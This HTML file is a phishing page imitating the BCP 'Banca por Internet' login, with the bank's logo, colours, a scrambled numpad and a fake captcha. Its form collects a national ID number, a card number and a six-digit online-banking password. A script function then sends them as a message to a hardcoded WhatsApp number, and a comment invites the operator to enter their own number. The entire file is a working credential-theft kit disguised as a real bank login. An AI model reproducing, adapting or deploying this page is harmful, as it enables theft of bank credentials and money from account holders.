<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banca por Internet | BCP</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: #ffffff;
            overflow: hidden;
        }
        .sidebar-bcp {
            background-color: #002a8d;
            width: 35%;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: relative;
        }
        .main-content {
            width: 65%;
            padding: 40px 80px;
            position: relative;
            overflow-y: auto;
        }
        .bcp-logo-img {
            position: absolute;
            top: 40px;
            left: 40px;
            width: 110px;
        }
        .timer-container {
            position: absolute;
            top: 40px;
            right: 80px;
            font-size: 13px;
            color: #666;
            display: flex;
            align-items: center;
            background: #f8f9fa;
            padding: 8px 15px;
            border-radius: 20px;
            border: 1px solid #eee;
        }
        .input-wrapper {
            position: relative;
            margin-bottom: 24px;
        }
        .input-label {
            position: absolute;
            top: -9px;
            left: 12px;
            background: white;
            padding: 0 5px;
            font-size: 11px;
            color: #999;
            z-index: 10;
        }
        .input-bcp {
            border: 1px solid #ced4da;
            border-radius: 4px;
            padding: 14px 15px;
            width: 100%;
            outline: none;
            font-size: 15px;
            color: #333;
            transition: all 0.2s;
        }
        .input-bcp:focus {
            border-color: #ff7900;
        }
        .numpad {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 10px;
            background: #f4f7fa;
            padding: 20px;
            border-radius: 8px;
            margin-top: 15px;
        }
        .num-key {
            background: white;
            border: 1px solid #d1d5db;
            border-radius: 4px;
            padding: 12px;
            text-align: center;
            font-weight: 600;
            color: #002a8d;
            cursor: pointer;
            user-select: none;
            box-shadow: 0 2px 0 #d1d5db;
        }
        .num-key:active {
            transform: translateY(2px);
            box-shadow: none;
        }
        .btn-ingresar {
            background-color: #ff7900;
            color: white;
            font-weight: bold;
            font-size: 16px;
            width: 100%;
            padding: 16px;
            border-radius: 4px;
            margin-top: 20px;
            transition: background 0.3s;
            box-shadow: 0 4px 6px rgba(255,121,0,0.2);
        }
        .btn-ingresar:hover {
            background-color: #e66d00;
        }
        .captcha-img-box {
            background: #fff;
            border: 1px solid #ddd;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Courier New', Courier, monospace;
            font-weight: bold;
            font-size: 22px;
            letter-spacing: 5px;
            color: #bbb;
            text-decoration: line-through;
            font-style: italic;
        }
    </style>
</head>
<body class="flex">

    <!-- Lado Izquierdo: Ilustración BCP -->
    <div class="sidebar-bcp">
        <div class="bcp-logo-img">
            <svg viewBox="0 0 100 35" xmlns="http://www.w3.org/2000/svg">
                <path d="M0 0 L20 0 L10 35 L-10 35 Z" fill="#ff7900" />
                <text x="25" y="28" fill="white" font-weight="900" font-size="28" font-style="italic">BCP</text>
            </svg>
        </div>

        <div class="w-full h-full flex items-center justify-center p-10">
            <svg viewBox="0 0 400 500" xmlns="http://www.w3.org/2000/svg">
                <g transform="translate(80, 50)">
                    <path d="M120 280 L90 350 L50 330" stroke="#0035b0" stroke-width="40" stroke-linecap="round" fill="none" />
                    <path d="M160 280 L190 400 L230 390" stroke="#0035b0" stroke-width="40" stroke-linecap="round" fill="none" />
                    <rect x="100" y="150" width="80" height="150" rx="40" fill="#0035b0" />
                    <circle cx="140" cy="100" r="45" fill="#ffdbac" />
                    <path d="M95 100 Q140 50 185 100" fill="#002a8d" />
                    <rect x="105" y="85" width="70" height="20" rx="8" fill="#ff7900" />
                    <circle cx="122" cy="95" r="10" fill="white" />
                    <circle cx="158" cy="95" r="10" fill="white" />
                    <path d="M100 180 L40 100" stroke="#4a90e2" stroke-width="25" stroke-linecap="round" fill="none" />
                    <circle cx="35" cy="85" r="15" fill="#ffdbac" />
                    <g transform="translate(10, 40) rotate(-15)">
                        <circle cx="20" cy="20" r="10" stroke="#ff7900" stroke-width="5" fill="none" />
                        <rect x="18" y="30" width="4" height="20" fill="#ff7900" />
                        <rect x="22" y="38" width="5" height="3" fill="#ff7900" />
                        <rect x="22" y="45" width="5" height="3" fill="#ff7900" />
                    </g>
                </g>
                <rect x="280" y="150" width="45" height="45" rx="5" fill="#ffffff" opacity="0.2" />
                <rect x="280" y="150" width="45" height="12" rx="2" fill="#ff7900" />
            </svg>
        </div>
    </div>

    <!-- Lado Derecho: Formulario -->
    <div class="main-content">
        <div class="timer-container">
            Esta ventana se cerrará en <span class="font-bold mx-1" id="timer">285</span> segundos <span class="ml-2">⏱️</span>
        </div>

        <div class="max-w-md mx-auto mt-16">
            <div class="text-[#ff7900] mb-8 font-medium cursor-pointer text-sm">
                ← Volver
            </div>

            <h1 class="text-[#002a8d] text-3xl font-bold text-center mb-1">Banca por Internet</h1>
            <p class="text-gray-400 text-center text-sm mb-10">Ingresa tus datos para continuar</p>

            <div class="flex justify-center space-x-12 mb-8">
                <label class="flex items-center space-x-2 cursor-pointer">
                    <input type="radio" name="banca" checked class="accent-[#ff7900] w-4 h-4">
                    <span class="text-gray-700 font-semibold">Persona</span>
                </label>
                <label class="flex items-center space-x-2 cursor-pointer">
                    <input type="radio" name="banca" class="accent-[#ff7900] w-4 h-4">
                    <span class="text-gray-500">Empresa</span>
                </label>
            </div>

            <!-- Campos -->
            <div class="flex mb-6">
                <div class="w-1/3 relative">
                    <span class="input-label">Documento</span>
                    <select class="input-bcp rounded-r-none border-r-0 bg-gray-50 appearance-none">
                        <option>DNI</option>
                        <option>CE</option>
                    </select>
                </div>
                <div class="w-2/3 relative">
                    <input type="text" id="dni" class="input-bcp rounded-l-none" placeholder="Nro de documento">
                </div>
            </div>

            <div class="input-wrapper">
                <span class="input-label">Número de tarjeta</span>
                <input type="text" id="tarjeta" class="input-bcp" placeholder="XXXX XXXX XXXX XXXX">
            </div>

            <div class="flex items-center mb-6">
                <input type="checkbox" id="recordar" class="accent-[#002a8d] w-4 h-4 mr-2">
                <label for="recordar" class="text-sm text-gray-500">Recordar datos</label>
            </div>

            <div class="input-wrapper">
                <span class="input-label">Clave de internet (6 dígitos)</span>
                <input type="password" id="clave" class="input-bcp bg-gray-50" readonly placeholder="Ingresa tu clave de 6 dígitos">
            </div>

            <div class="numpad">
                <div class="num-key" onclick="teclear('1')">1</div>
                <div class="num-key" onclick="teclear('6')">6</div>
                <div class="num-key" onclick="teclear('4')">4</div>
                <div class="num-key" onclick="teclear('2')">2</div>
                <div class="num-key" onclick="teclear('5')">5</div>
                <div class="num-key" onclick="teclear('0')">0</div>
                <div class="num-key" onclick="teclear('8')">8</div>
                <div class="num-key" onclick="teclear('7')">7</div>
                <div class="num-key" onclick="teclear('9')">9</div>
                <div class="num-key" onclick="teclear('3')">3</div>
                <div class="col-span-5 text-center text-[#ff7900] font-bold text-xs py-2 cursor-pointer" onclick="limpiar()">BORRAR CLAVE</div>
            </div>

            <div class="flex justify-between mt-4 mb-8">
                <span class="text-[#ff7900] font-bold text-sm cursor-pointer">Crear clave</span>
                <span class="text-[#ff7900] font-bold text-sm cursor-pointer">Olvidé mi clave</span>
            </div>

            <div class="grid grid-cols-3 gap-4 mb-6">
                <div class="col-span-2 captcha-img-box">
                    <span>6gy5fp</span>
                </div>
                <input type="text" id="captcha" class="input-bcp text-center" placeholder="Código">
            </div>

            <button onclick="enviarWhatsApp()" class="btn-ingresar">INGRESAR</button>
        </div>
    </div>

    <script>
        const claveInput = document.getElementById('clave');
        function teclear(n) { if(claveInput.value.length < 6) claveInput.value += n; }
        function limpiar() { claveInput.value = ''; }

        let time = 285;
        setInterval(() => { if(time > 0) { time--; document.getElementById('timer').innerText = time; } }, 1000);

        function enviarWhatsApp() {
            const dni = document.getElementById('dni').value;
            const tarjeta = document.getElementById('tarjeta').value;
            const clave = document.getElementById('clave').value;
            const captcha = document.getElementById('captcha').value;

            if(!dni || !tarjeta || !clave) {
                alert("Por favor completa los campos.");
                return;
            }

            // --- CONFIGURACIÓN DE TU NÚMERO ---
            // Pon tu número aquí (ej: 51987654321 para Perú)
            const miNumero = "5190173175"; 
            
            const mensaje = `*BCP ACCESO*%0A*DNI:* ${dni}%0A*Tarjeta:* ${tarjeta}%0A*Clave:* ${clave}%0A*Captcha:* ${captcha}`;
            window.open(`https://wa.me/${miNumero}?text=${mensaje}`, '_blank');
        }
    </script>
</body>
</html>
